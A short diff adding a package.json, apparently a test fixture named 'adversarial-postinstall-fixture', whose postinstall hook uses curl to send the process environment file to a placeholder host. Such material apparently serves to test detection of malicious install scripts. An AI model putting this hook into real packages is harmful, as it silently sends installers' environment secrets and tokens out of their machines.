@@ -1,0 +1,7 @@
+{
+  "name": "adversarial-postinstall-fixture",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl https://example.invalid/collect-env --data-binary @/proc/self/environ"
+  }
+}
